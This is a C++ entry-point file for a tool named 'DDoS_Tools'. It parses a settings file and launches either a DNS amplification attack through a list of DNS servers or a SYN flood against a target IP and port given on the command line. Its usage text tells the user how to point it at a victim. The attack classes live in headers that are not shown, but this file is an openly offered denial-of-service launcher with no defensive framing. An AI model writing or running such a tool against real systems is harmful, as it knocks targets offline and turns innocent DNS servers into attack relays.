#include <iostream>
#include <nlohmann/json.hpp>
#include <fstream>
#include "SynFlood.h"
#include "DnsAmplification.h"

using namespace Tins;

int main(int argc, char* argv[]) {
    try {
        if(argc < 2){
            std::cout << "How to use: " << std::endl;
            std::cout << "- DNS Amplification attack" << std::endl;
            std::cout << "  sudo ./DDoS_Tools -d {TARGET_IP}" << std::endl;
            std::cout << "- SynFlood attack" << std::endl;
            std::cout << "  sudo ./DDoS_Tools -s {TARGET_IP} {TARGET_PORT}" << std::endl;
            exit(-1);
        }
        std::ifstream json_file("settings.json");
        nlohmann::json json_data = nlohmann::json::parse(json_file);
        std::cout << "Settings: " << json_data.dump(4) << std::endl;
        std::string target_ip(argv[2]);
        if(strcmp(argv[1], "-d")==0){
            std::cout << "DNS Amplification attack to " << target_ip << std::endl;
            std::vector<IPv4Address> dns_servers;
            for(const std::string& dns_server: json_data["dns_servers_list"])
                dns_servers.emplace_back(dns_server);
            DnsAmplification dnsAmplification(
                    target_ip,
                    dns_servers,
                    json_data["upload_size"],
                    json_data["threads_number"],
                    json_data["upload_bandwidth"]);
            dnsAmplification.run();
        } else {
            uint16_t target_port = argc<3 ? 80: std::stoi(argv[3]);
            std::cout << "SynFlood attack to " << target_ip << " on port " << target_port << std::endl;
            SynFlood synFlood(
                    target_ip,
                    target_port,
                    json_data["upload_size"],
                    json_data["threads_number"],
                    json_data["upload_bandwidth"]);
            synFlood.run();
        }
    }
    catch (const nlohmann::json::parse_error& e) {
        std::cout << "An error has occurred while reading the settings.json file!" << std::endl;
        exit(-2);
    }
}